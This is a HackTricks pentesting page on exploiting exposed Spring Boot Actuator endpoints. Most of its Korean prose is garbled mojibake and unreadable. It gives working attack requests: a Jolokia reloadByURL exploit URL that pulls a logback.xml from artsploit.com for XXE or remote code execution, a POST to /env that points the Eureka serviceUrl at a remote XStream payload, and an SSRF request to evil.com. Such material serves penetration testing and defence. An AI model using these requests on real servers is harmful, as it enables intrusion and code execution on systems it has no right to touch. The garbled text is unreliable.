# Spring Actuators

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong>!</summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

- **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ì˜ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ì…í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- **ğŸ’¬ [ë””ìŠ¤ì½”ë“œ ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ìˆ ì„ ê³µìœ í•˜ë ¤ë©´ [HackTricks](https://github.com/carlospolop/hacktricks) ë° [HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œë¡œ PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

**From** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Exploiting Spring Boot Actuators

**Check the original post from** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **Key Points:**

- Spring Boot Actuators register endpoints such as `/health`, `/trace`, `/beans`, `/env`, ë“±ì„ ë“±ë¡í•©ë‹ˆë‹¤. ë²„ì „ 1ì—ì„œ 1.4ê¹Œì§€ëŠ” ì´ëŸ¬í•œ ì—”ë“œí¬ì¸íŠ¸ì— ì¸ì¦ ì—†ì´ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë²„ì „ 1.5ë¶€í„°ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ `/health` ë° `/info`ë§Œ ë¯¼ê°í•˜ì§€ ì•Šì§€ë§Œ, ê°œë°œìë“¤ì€ ì´ ë³´ì•ˆì„ ì¢…ì¢… ë¹„í™œì„±í™”í•©ë‹ˆë‹¤.
- íŠ¹ì • Actuator ì—”ë“œí¬ì¸íŠ¸ëŠ” ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ë…¸ì¶œí•˜ê±°ë‚˜ í•´ë¡œìš´ ì‘ì—…ì„ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
  - `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart`, ë° `/heapdump`.
- Spring Boot 1.xì—ì„œëŠ” ì•¡ì¶”ì—í„°ê°€ ë£¨íŠ¸ URLì— ë“±ë¡ë˜ì§€ë§Œ, 2.xì—ì„œëŠ” `/actuator/` ê¸°ë³¸ ê²½ë¡œ ì•„ë˜ì— ë“±ë¡ë©ë‹ˆë‹¤.

### **Exploitation Techniques:**

1. **'/jolokia'ë¥¼ í†µí•œ ì›ê²© ì½”ë“œ ì‹¤í–‰**:
  - `/jolokia` ì•¡ì¶”ì—í„° ì—”ë“œí¬ì¸íŠ¸ëŠ” Jolokia ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë…¸ì¶œì‹œí‚¤ë©°, MBeansì— HTTP ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤.
  - `reloadByURL` ì‘ì—…ì€ ì™¸ë¶€ URLì—ì„œ ë¡œê¹… êµ¬ì„±ì„ ë‹¤ì‹œë¡œë“œí•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì¡°ì‘ëœ XML êµ¬ì„±ì„ í†µí•œ ë¸”ë¼ì¸ë“œ XXE ë˜ëŠ” ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
  - ì˜ˆì‹œ exploit URL: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.
2. **'/env'ë¥¼ í†µí•œ êµ¬ì„± ìˆ˜ì •**:
  - Spring Cloud ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ ìˆëŠ” ê²½ìš°, `/env` ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ í™˜ê²½ ì†ì„±ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
  - ì†ì„±ì„ ì¡°ì‘í•˜ì—¬ ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆìœ¼ë©°, ì˜ˆë¥¼ ë“¤ì–´ Eureka serviceURLì˜ XStream ì§ë ¬í™” ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤.
  - ì˜ˆì‹œ exploit POST ìš”ì²­:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
3. **ê¸°íƒ€ ìœ ìš©í•œ ì„¤ì •**:
  - `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url`, ë° `spring.datasource.tomcat.max-active`ì™€ ê°™ì€ ì†ì„±ì€ SQL ì¸ì ì…˜ ë˜ëŠ” ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²° ë¬¸ìì—´ ë³€ê²½ê³¼ ê°™ì€ ë‹¤ì–‘í•œ ì•…ìš©ì„ ìœ„í•´ ì¡°ì‘ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **ì¶”ê°€ ì •ë³´:**

- ê¸°ë³¸ ì•¡ì¶”ì—í„°ì˜ í¬ê´„ì ì¸ ëª©ë¡ì€ [ì—¬ê¸°](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- Spring Boot 2.xì˜ `/env` ì—”ë“œí¬ì¸íŠ¸ëŠ” ì†ì„± ìˆ˜ì •ì„ ìœ„í•´ JSON í˜•ì‹ì„ ì‚¬ìš©í•˜ì§€ë§Œ, ì¼ë°˜ì ì¸ ê°œë…ì€ ë™ì¼í•©ë‹ˆë‹¤.

### **ê´€ë ¨ ì£¼ì œ:**

1. **Env + H2 RCE**:
  - `/env` ì—”ë“œí¬ì¸íŠ¸ì™€ H2 ë°ì´í„°ë² ì´ìŠ¤ì˜ ì¡°í•©ì„ ì•…ìš©í•˜ëŠ” ì„¸ë¶€ ì •ë³´ëŠ” [ì—¬ê¸°](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. **ì˜ëª»ëœ ê²½ë¡œ ì´ë¦„ í•´ì„ì„ í†µí•œ Spring Boot SSRF**:
  - Spring í”„ë ˆì„ì›Œí¬ê°€ HTTP ê²½ë¡œ ì´ë¦„ì— ëŒ€í•œ ë§¤íŠ¸ë¦­ìŠ¤ ë§¤ê°œë³€ìˆ˜ (`;`)ë¥¼ ì²˜ë¦¬í•˜ëŠ” ë°©ì‹ì„ ì•…ìš©í•˜ì—¬ ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡° (SSRF)ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
  - ì˜ˆì‹œ exploit ìš”ì²­:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
